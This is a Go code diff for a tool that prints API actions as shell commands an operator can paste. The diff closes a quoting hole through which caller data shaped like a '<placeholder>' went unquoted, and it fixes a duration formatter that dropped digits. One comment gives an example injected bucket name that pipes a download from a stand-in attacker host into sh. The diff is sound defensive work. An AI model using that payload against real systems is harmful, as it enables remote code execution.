@@ -77,7 +77,6 @@ import (
 	"sort"
 	"strconv"
 	"strings"
-	"time"
 )
 
 // Action is one API action, as the request that performed it.
@@ -121,6 +120,25 @@ type Line struct {
 	// standing in for something this request cannot name on a command
 	// line, so the line is not runnable as printed.
 	Placeholder bool
+
+	// placeholderAt is the set of Command positions the BUILDER filled
+	// with such a stand-in, and it is what Shell reads to decide what not
+	// to quote.
+	//
+	// It is carried here, out of band, rather than being recognised from
+	// the text at print time, and that is the whole reason it exists. The
+	// renderer used to leave any argument beginning with "<" and ending
+	// with ">" unquoted, which let caller-supplied data claim to be a
+	// placeholder simply by being shaped like one: a bucket named
+	// "<a; curl http://evil.example/ | sh>" rendered as an ordinary
+	// runnable command with nothing marking it. No shape test can tell
+	// the two apart, because the shape is the caller's to choose; only
+	// the builder knows, and now only the builder says.
+	//
+	// Unexported because it is a fact about how Shell renders, not part
+	// of what an action WAS. Placeholder above is the public half, and it
+	// is what a client renders "not runnable as printed" from.
+	placeholderAt map[int]bool
 }
 
 // Shell is the command as one line an operator can paste: the argv,
@@ -145,7 +163,16 @@ func (l Line) Shell() string {
 		return ""
 	}
 	quoted := make([]string, 0, len(l.Command))
-	for _, arg := range l.Command {
+	for i, arg := range l.Command {
+		if l.placeholderAt[i] {
+			// The one thing that goes on the line unquoted, and only
+			// because the builder marked this position: the line already
+			// says it is not runnable as printed, and
+			// '<the file you chose>' reads like a filename somebody could
+			// use.
+			quoted = append(quoted, arg)
+			continue
+		}
 		quoted = append(quoted, shellQuote(arg))
 	}
 	return strings.Join(quoted, " ")
@@ -188,9 +215,11 @@ func Echo(a Action) Line {
 	}
 	line.Command = c.argv
 	line.Placeholder = c.placeholder
+	line.placeholderAt = c.placeholderAt
 	if c.gap != "" {
 		line.Command = nil
 		line.Placeholder = false
+		line.placeholderAt = nil
 		line.Gap = gapNoEquivalent
 		line.GapDetail = c.gap
 	}
@@ -261,6 +290,11 @@ type cmd struct {
 	argv        []string
 	placeholder bool
 
+	// placeholderAt is which of those argv positions hold a <stand-in>
+	// rather than a value, recorded as the builder writes them. See
+	// Line.placeholderAt for why this is carried rather than recognised.
+	placeholderAt map[int]bool
+
 	// gap turns this build into a gap after the fact, for the case where
 	// the request itself is what has no equivalent rather than the route.
 	gap string
@@ -311,6 +345,10 @@ func (c *cmd) assigned(name string, v bool) *cmd {
 // inline.
 func (c *cmd) placeholderFlag(name, what string) *cmd {
 	c.argv = append(c.argv, "--"+name, "<"+what+">")
+	if c.placeholderAt == nil {
+		c.placeholderAt = make(map[int]bool, 1)
+	}
+	c.placeholderAt[len(c.argv)-1] = true
 	c.placeholder = true
 	return c
 }
@@ -343,33 +381,76 @@ func decode(body []byte, out any) bool {
 
 // seconds renders a duration flag's value the way an operator would type
 // it: 172800 seconds is 48h, not 48h0m0s.
+//
+// It is built out of the hours, minutes and seconds rather than trimmed
+// out of time.Duration's own text, and that is the whole point of the
+// function. Trimming a two-character "0s" or "0m" off the end cannot tell
+// a zero UNIT from the last digit of a value, so it ate a digit from
+// every duration whose last component ends in zero: 30 seconds printed as
+// "3", 600 as "1", and 3610 as "1h0m1". None of those parse, both flags
+// this feeds are flag.Duration, and the two values this package's own
+// examples happened to use (300 and 172800) were two of the few that
+// survived it, which is why the end-to-end parse test stayed green.
+//
+// Every component that is zero is left out and every one that is not is
+// printed whole, so the output is one of "0s", "10s", "1m30s", "5m",
+// "1h", "1h10s" or "26h3m4s", and time.ParseDuration takes all of them
+// back as the same number of seconds. seconds_test.go sweeps the range
+// rather than sampling it.
 func seconds(v int) string {
-	s := (time.Duration(v) * time.Second).String()
-	// Duration.String always spells every unit down to seconds, so 48h
-	// arrives as "48h0m0s". Trimming the trailing zero units in order
-	// leaves "48h", "5m" and "30s" and leaves "1h30m" alone, and every
-	// one of those is a value time.ParseDuration takes back.
-	if strings.HasSuffix(s, "0s") && s != "0s" {
-		s = strings.TrimSuffix(s, "0s")
+	if v == 0 {
+		return "0s"
 	}
-	if strings.HasSuffix(s, "0m") && s != "0m" {
-		s = strings.TrimSuffix(s, "0m")
+	n := int64(v)
+	sign := ""
+	if n < 0 {
+		// A negative freshness budget is not a thing anybody configures,
+		// but this renders whatever the request carried rather than
+		// asserting about it: the handler beside this line is what
+		// refuses a nonsense value, and a line that silently dropped the
+		// sign would describe a different request from the one made.
+		sign, n = "-", -n
 	}
-	return s
+	var b strings.Builder
+	b.WriteString(sign)
+	if h := n / 3600; h > 0 {
+		b.WriteString(strconv.FormatInt(h, 10))
+		b.WriteByte('h')
+	}
+	if m := (n % 3600) / 60; m > 0 {
+		b.WriteString(strconv.FormatInt(m, 10))
+		b.WriteByte('m')
+	}
+	if s := n % 60; s > 0 {
+		b.WriteString(strconv.FormatInt(s, 10))
+		b.WriteByte('s')
+	}
+	return b.String()
 }
 
 // shellQuote makes one argument safe to paste into a shell, and leaves
 // alone the ones that need nothing.
 //
-// A placeholder is deliberately left unquoted: the line carrying one
-// already says it is not runnable as printed, and '<the file you chose>'
-// reads like a filename somebody could use.
+// It quotes on the CHARACTERS in the string and on nothing else. It used
+// to make one exception, for an argument beginning with "<" and ending
+// with ">", on the reasoning that such a thing is one of this package's
+// own placeholders and '<the file you chose>' reads like a filename
+// somebody could use. The exception was right about the display and wrong
+// about the decision: it read the text to work out where the text came
+// from, and the text is the caller's. Every one of --bucket, --endpoint,
+// --prefix, --storage-class, --known-hosts-line, --note, --host, --user,
+// --remote-path, --local-path and --include carries a string somebody
+// typed into a browser, path parameters carry them too, and a value shaped
+// like a placeholder rendered as an ordinary runnable command, on a panel
+// with a $ prompt in front of it and a copy button beside it, without even
+// being marked not runnable as printed.
+//
+// A placeholder still renders bare, and Line.Shell is where that now
+// happens: the builder records WHICH positions it filled with a stand-in,
+// so nothing a caller sends can claim to be one.
 func shellQuote(s string) string {
 	if s == "" {
 		return "''"
-	}
-	if strings.HasPrefix(s, "<") && strings.HasSuffix(s, ">") {
-		return s
 	}
 	safe := func(r rune) bool {
 		return r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' ||
